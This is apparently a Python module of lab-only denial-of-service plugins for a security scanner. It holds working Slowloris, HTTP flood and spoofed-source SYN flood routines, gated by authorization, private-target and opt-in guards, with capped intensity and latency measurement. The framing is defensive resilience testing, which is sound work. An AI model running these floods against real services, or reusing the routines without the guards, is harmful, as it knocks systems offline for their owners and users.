"""
P2 - Denial-of-Service modules (LAB ONLY), reimplemented from scratch.
Category: A02:2025 Security Misconfiguration (availability / missing hardening).

==============================  SAFETY FIRST  ===============================
These modules are DESTRUCTIVE by nature. They run ONLY when ALL guards pass:
  1. ctx.authorized is True              (the --i-have-authorization flag), AND
  2. target.is_private()                 (loopback / private lab network), AND
  3. ctx.extra["enable_dos"] is True     (explicit per-scan opt-in).
Guards 1 and 2 are the shared ethics gate (ctx.ethics_gate); we call it again
here as defense-in-depth, and add guard 3 so DoS NEVER runs by accident, even
inside an otherwise-authorized scan. A failed guard yields an INFO "refused"
finding instead of raising, so the rest of the scan keeps running.

Intensity is deliberately BRIDLED (hard ceilings below) and the impact is
MEASURED (target response time before vs. during) so the demo is a *measured
demonstration*, not a blind flood. Show the guards to the jury BEFORE the demo.
=============================================================================

Three techniques:
  - Slowloris   : many sockets, partial HTTP headers kept alive ("low and slow").
                  Pure stdlib. Effective vs. threaded servers (Apache), not nginx.
  - HTTP flood  : many concurrent legitimate GETs (Layer 7). asyncio + httpx.
  - SYN flood   : spoofed half-open SYN packets (Layer 4). OPTIONAL (Scapy);
                  degrades to a refused finding if Scapy/privileges are missing.
"""
from __future__ import annotations

import asyncio
import random
import socket
import statistics
import time

import httpx

from core import AttackPlugin, Context, Finding, Severity, Target, register

# --- Hard safety ceilings (cannot be exceeded via ctx.extra) ----------------
MAX_DURATION_S = 15.0        # wall-clock cap per DoS run
MAX_CONNECTIONS = 300        # Slowloris / SYN burst cap
MAX_FLOOD_REQUESTS = 2000    # HTTP flood cap


def _clamp(value, lo, hi):
    return max(lo, min(value, hi))


async def _measure_latency(url: str, timeout: float, samples: int = 5) -> float | None:
    """Median response time (seconds) of the target, or None if unreachable."""
    times: list[float] = []
    async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
        for _ in range(samples):
            t0 = time.perf_counter()
            try:
                await client.get(url)
                times.append(time.perf_counter() - t0)
            except httpx.HTTPError:
                times.append(timeout)  # count a failure as a full timeout
            await asyncio.sleep(0.05)
    return statistics.median(times) if times else None


class _DosBase(AttackPlugin):
    """Shared guard + impact-measurement logic for every DoS technique."""

    owasp_category = "A02:2025 Security Misconfiguration"
    technique = "generic"

    def _guard(self, target: Target, ctx: Context) -> Finding | None:
        """Return a refusal Finding if any guard fails, else None."""
        if not ctx.extra.get("enable_dos"):
            return self._refused(target,
                "DoS disabled: set ctx.extra['enable_dos']=True to opt in.")
        try:
            ctx.ethics_gate(target)       # authorization + private target
        except PermissionError as e:
            return self._refused(target, str(e))
        return None

    def _refused(self, target: Target, why: str) -> Finding:
        return Finding(
            category=self.owasp_category,
            title=f"DoS '{self.technique}' not executed (safety guard)",
            severity=Severity.INFO,
            evidence=why,
            recommendation="DoS testing requires written authorization and a lab target.",
            target=target.host, plugin=self.name)

    def _impact_finding(self, target, before, after, detail) -> Finding:
        if before and after:
            ratio = after / before if before > 0 else float("inf")
            degraded = ratio >= 2.0 or after >= MAX_DURATION_S
            sev = Severity.HIGH if degraded else Severity.LOW
            score = 7.5 if degraded else 3.5
            verdict = ("TARGET DEGRADED: response time rose "
                       f"x{ratio:.1f}") if degraded else \
                      "target held up (no significant degradation)"
        else:
            sev, score, verdict = Severity.MEDIUM, 5.0, \
                "target became unreachable during the test"
        return Finding(
            category=self.owasp_category,
            title=f"DoS resilience test ({self.technique}): {verdict}",
            severity=sev, cvss_score=score,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
            evidence=(f"{detail}\nResponse time before: "
                      f"{before*1000:.0f} ms\n" if before else detail + "\n")
                     + (f"Response time during: {after*1000:.0f} ms"
                        if after else "Target unreachable during attack."),
            recommendation=self._mitigation(),
            target=target.base_url, plugin=self.name)

    def _mitigation(self) -> str:
        return "Rate-limiting, connection timeouts, reverse proxy, WAF/anti-DDoS."


# --- 1. Slowloris -----------------------------------------------------------
@register
class SlowlorisPlugin(_DosBase):
    name = "dos_slowloris"
    technique = "slowloris"

    async def run(self, target: Target, ctx: Context) -> list[Finding]:
        refused = self._guard(target, ctx)
        if refused:
            return [refused]

        host = target.host
        port = target.port if target.port not in (0, None) else 80
        n_conn = _clamp(int(ctx.extra.get("dos_connections", 100)), 1, MAX_CONNECTIONS)
        duration = _clamp(float(ctx.extra.get("dos_duration", 8.0)), 1.0, MAX_DURATION_S)

        before = await _measure_latency(target.base_url, ctx.timeout)
        alive = await self._run_slowloris(host, port, n_conn, duration)
        after = await _measure_latency(target.base_url, ctx.timeout)

        detail = (f"Opened {n_conn} sockets sending partial HTTP headers, "
                  f"kept alive for {duration:.0f}s ({alive} still open at the end).")
        return [self._impact_finding(target, before, after, detail)]

    async def _run_slowloris(self, host, port, n_conn, duration) -> int:
        """Open sockets, send an incomplete request, drip a header every ~10s."""
        loop = asyncio.get_running_loop()

        def open_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                # Incomplete request: NO final blank line -> server waits.
                s.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send(b"User-Agent: Mozilla/5.0\r\n")
                s.setblocking(False)
                return s
            except OSError:
                return None

        sockets = [s for s in await asyncio.gather(
            *(loop.run_in_executor(None, open_socket) for _ in range(n_conn)))
            if s is not None]

        deadline = time.perf_counter() + duration
        while time.perf_counter() < deadline and sockets:
            await asyncio.sleep(min(10.0, max(0.0, deadline - time.perf_counter())))
            survivors = []
            for s in sockets:
                try:
                    s.send(b"X-a: b\r\n")      # keep the connection just alive
                    survivors.append(s)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            sockets = survivors

        alive = len(sockets)
        for s in sockets:
            try:
                s.close()
            except OSError:
                pass
        return alive

    def _mitigation(self) -> str:
        return ("Limit per-IP connections, set header-read timeouts "
                "(Apache mod_reqtimeout), prefer an event-driven server "
                "(nginx) or a reverse proxy.")


# --- 2. HTTP flood (Layer 7) ------------------------------------------------
@register
class HttpFloodPlugin(_DosBase):
    name = "dos_http_flood"
    technique = "http_flood"

    async def run(self, target: Target, ctx: Context) -> list[Finding]:
        refused = self._guard(target, ctx)
        if refused:
            return [refused]

        n_req = _clamp(int(ctx.extra.get("dos_requests", 500)), 1, MAX_FLOOD_REQUESTS)
        concurrency = _clamp(int(ctx.extra.get("dos_concurrency", 50)), 1, 200)
        duration = _clamp(float(ctx.extra.get("dos_duration", 8.0)), 1.0, MAX_DURATION_S)

        before = await _measure_latency(target.base_url, ctx.timeout)
        sent, errors = await self._run_flood(target.base_url, n_req,
                                              concurrency, duration, ctx.timeout)
        after = await _measure_latency(target.base_url, ctx.timeout)

        detail = (f"Sent {sent} GET requests ({concurrency} concurrent, "
                  f"{errors} errors) over up to {duration:.0f}s.")
        return [self._impact_finding(target, before, after, detail)]

    async def _run_flood(self, url, n_req, concurrency, duration, timeout):
        sem = asyncio.Semaphore(concurrency)
        deadline = time.perf_counter() + duration
        sent = errors = 0
        lock = asyncio.Lock()

        async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
            async def one():
                nonlocal sent, errors
                if time.perf_counter() >= deadline:
                    return
                async with sem:
                    try:
                        await client.get(url)
                        async with lock:
                            sent += 1
                    except httpx.HTTPError:
                        async with lock:
                            errors += 1
            await asyncio.gather(*(one() for _ in range(n_req)))
        return sent, errors


# --- 3. SYN flood (Layer 4) -- OPTIONAL (Scapy) -----------------------------
@register
class SynFloodPlugin(_DosBase):
    name = "dos_syn_flood"
    technique = "syn_flood"

    async def run(self, target: Target, ctx: Context) -> list[Finding]:
        refused = self._guard(target, ctx)
        if refused:
            return [refused]

        port = target.port if target.port not in (0, None) else 80
        count = _clamp(int(ctx.extra.get("dos_packets", 500)), 1, 5000)
        duration = _clamp(float(ctx.extra.get("dos_duration", 8.0)), 1.0, MAX_DURATION_S)

        before = await _measure_latency(target.base_url, ctx.timeout)
        loop = asyncio.get_running_loop()
        try:
            sent = await loop.run_in_executor(
                None, self._syn_flood_sync, target.host, port, count, duration)
        except RuntimeError as e:
            return [self._refused(target, f"SYN flood unavailable: {e}")]
        after = await _measure_latency(target.base_url, ctx.timeout)

        detail = (f"Sent {sent} spoofed SYN packets to {target.host}:{port} "
                  "without completing the handshake (half-open table saturation).")
        return [self._impact_finding(target, before, after, detail)]

    @staticmethod
    def _syn_flood_sync(host, port, count, duration) -> int:
        try:
            from scapy.all import IP, TCP, RandShort, send  # type: ignore
            from scapy.all import conf
        except Exception as e:
            raise RuntimeError(f"Scapy unavailable: {e}")
        conf.verb = 0
        deadline = time.perf_counter() + duration
        sent = 0
        try:
            for _ in range(count):
                if time.perf_counter() >= deadline:
                    break
                src = ".".join(str(random.randint(1, 254)) for _ in range(4))
                pkt = IP(src=src, dst=host) / TCP(sport=RandShort(),
                                                  dport=port, flags="S")
                send(pkt)
                sent += 1
        except PermissionError as e:
            raise RuntimeError(f"raw socket denied (need root/admin): {e}")
        return sent

    def _mitigation(self) -> str:
        return ("Enable SYN cookies, reduce the SYN-ACK retry count, use a "
                "stateful firewall / anti-DDoS upstream.")
